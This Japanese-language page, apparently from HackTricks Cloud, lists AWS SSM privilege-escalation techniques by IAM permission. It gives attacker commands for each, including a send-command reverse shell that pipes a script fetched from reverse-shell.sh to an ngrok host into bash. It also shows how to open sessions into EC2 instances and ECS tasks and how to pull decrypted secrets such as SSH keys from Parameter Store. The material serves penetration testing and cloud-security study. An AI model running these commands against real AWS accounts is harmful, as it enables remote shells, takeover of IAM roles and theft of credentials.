# AWS - SSM特権昇格

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* もし、あなたの**会社をハックトリックで宣伝したい**場合や、**PEASSの最新バージョンを見たい**場合、または**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしましょう 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## SSM

SSMについての詳細は以下を参照してください：

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `ssm:SendCommand`

**`ssm:SendCommand`**の権限を持つ攻撃者は、Amazon SSMエージェントを実行しているインスタンスで**コマンドを実行**し、それによって**IAMロールを侵害**することができます。
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/4.tcp.ngrok.io:16084 | bash"

# If you are in the machine you can capture the reverseshel inside of it
nc -lvnp 4444 #Inside the EC2 instance
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/127.0.0.1:4444 | bash"
```
**潜在的な影響:** SSMエージェントが実行されているインスタンスにアタッチされたEC2 IAMロールへの直接の特権昇格。

### `ssm:StartSession`

**`ssm:StartSession`**権限を持つ攻撃者は、Amazon SSMエージェントが実行されているインスタンスで**SSHのようなセッションを開始**し、それに内部で実行されているIAMロールを**侵害**することができます。
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm start-session --target "$INSTANCE_ID"
```
**潜在的な影響:** 実行中のSSMエージェントが実行されているEC2 IAMロールへの直接の特権昇格。

#### ECSへの特権昇格

**ECSタスク**が**`ExecuteCommand`が有効**な状態で実行される場合、十分な権限を持つユーザーは`ecs execute-command`を使用してコンテナ内でコマンドを実行することができます。\
[**ドキュメント**](https://aws.amazon.com/blogs/containers/new-using-amazon-ecs-exec-access-your-containers-fargate-ec2/)によると、これは「_exec_」コマンドを開始するデバイスとSSMセッションマネージャーを介してターゲットコンテナ間に安全なチャネルを作成することで行われます。\
したがって、`ssm:StartSession`を持つユーザーは、そのオプションが有効なECSタスク内でシェルを取得することができます。以下のコマンドを実行します。
```bash
aws ssm start-session --target "ecs:CLUSTERNAME_TASKID_RUNTIMEID"
```
![](<../../../.gitbook/assets/image (55).png>)

**潜在的な影響:** `ExecuteCommand`が有効な実行中のタスクにアタッチされた`ECS`IAMロールへの直接の特権昇格。

### `ssm:ResumeSession`

**`ssm:ResumeSession`**権限を持つ攻撃者は、Amazon SSMエージェントを実行しているインスタンスで**切断されたSSMセッション状態でSSHのようなセッションを再開**し、それに内部で実行されているIAMロールを**侵害**することができます。
```bash
# Check for configured instances
aws ssm describe-sessions

# Get resume data (you will probably need to do something else with this info to connect)
aws ssm resume-session \
--session-id Mary-Major-07a16060613c408b5
```
**潜在的な影響:** SSMエージェントが実行され、セッションが切断された状態で実行中のEC2 IAMロールへの直接の特権昇格。

### `ssm:DescribeParameters`, (`ssm:GetParameter` | `ssm:GetParameters`)

上記の権限を持つ攻撃者は、**SSMパラメータ**をリスト化し、**平文で読み取る**ことができます。これらのパラメータには、SSHキーやAPIキーなどの**機密情報**が頻繁に含まれています。
```bash
aws ssm describe-parameters
# Suppose that you found a parameter called "id_rsa"
aws ssm get-parameters --names id_rsa --with-decryption
aws ssm get-parameter --name id_rsa --with-decryption
```
**潜在的な影響:** パラメータ内の機密情報を見つけることができます。

### `ssm:ListCommands`

この権限を持つ攻撃者は、送信されたすべての**コマンド**をリストアップし、それらに関する**機密情報**を見つけることができるかもしれません。
```
aws ssm list-commands
```
**潜在的な影響:** コマンドライン内の機密情報を見つけることができます。

### `ssm:GetCommandInvocation`, (`ssm:ListCommandInvocations` | `ssm:ListCommands`)

これらの権限を持つ攻撃者は、送信されたすべての**コマンド**をリスト化し、生成された**出力**を読み取ることができます。これにより、**機密情報**を見つけることができるでしょう。
```bash
# You can use any of both options to get the command-id and instance id
aws ssm list-commands
aws ssm list-command-invocations

aws ssm get-command-invocation --command-id <cmd_id> --instance-id <i_id>
```
**潜在的な影響:** コマンドラインの出力内に含まれる機密情報を見つけることができます。

### Codebuild

SSMを使用して、ビルド中のcodebuildプロジェクトにアクセスすることもできます：

{% content-ref url="aws-codebuild-privesc.md" %}
[aws-codebuild-privesc.md](aws-codebuild-privesc.md)
{% endcontent-ref %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もし、**HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンを入手したい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローしましょう 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>
